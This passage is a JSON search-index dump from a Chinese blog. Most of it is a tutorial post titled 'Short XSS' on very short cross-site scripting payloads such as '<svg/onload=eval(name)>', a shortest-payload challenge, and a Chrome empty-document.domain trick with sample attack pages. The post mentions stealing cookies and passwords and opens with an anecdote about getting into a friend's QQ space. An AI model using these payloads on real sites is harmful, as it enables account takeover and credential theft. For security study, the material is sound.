value=//\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 22 Letters \u0026lt;input type=hidden value=\u0026#34;//\u0026#34;\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt;\u0026#34;\u0026gt; 17 Letters \u0026lt;input type=text value= //onclick=URL=name\u0026gt; 0x04 挑战最”短”\n这个活动是国外一个网站发布的，名为XSS challenge，大家有兴趣可以讨论一下\n19 Letters\n\u0026lt;x/x=\u0026amp;{eval(name)}; 22 Letters\n\u0026lt;svg/onload=eval(name) 最短的javascript执行代码，考验你”短”的时候到了\n10 Letters eval(name) 9 Letters eval(URL) 8 Letters URL=name 6 Letters $(URL) 0x05 总结\nJavascript是一门很好玩的解释型语言，每次去研究这些XSS点的时候会有很多乐趣，你越不相信这个点有XSS，那么就越要去研究这个点是否有XSS。\n其实呢~~~这些技术可以称为猥琐流。。。因为不是按正常的逻辑思维是想不到这些的，除非那些思想很猥琐的人。\n欢迎你加入猥琐这个团队，让我们一起猥琐吧。\n","permalink":"https://wuyizhou.com/posts/short-xss/","summary":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：","title":"Short XSS"},{"content":" 出生于四川，90后生人，不抽烟，偶尔喝酒，目前居住四川成都。 毕业于重庆大学（非统招）工程造价管理专业，目前从事反网络犯罪的数据分析工作。 喜欢折腾家用的路由设备、NAS，目前理财小白一名。 公司经历\n2018年-至今：就职于成都无糖信息技术有限公司，负责反网络犯罪研究与情报研究。 项目经历\n“重明”情报系统：基于大量的黑灰产的多种数据通过机器学习进行信息识别、提取、分类，并将信息组织和关联，最终形成一个情报检索系统。 “网络犯罪趋势报告”：国内最早由企业从情报视角研究网络犯罪相关手法、产业链的白皮书，参与了第一版主导和编辑工作。 ","permalink":"https://wuyizhou.com/about/","summary":"about","title":"About"},{"content":"","permalink":"https://wuyizhou.com/posts/","summary":"posts","title":"New Posts"}]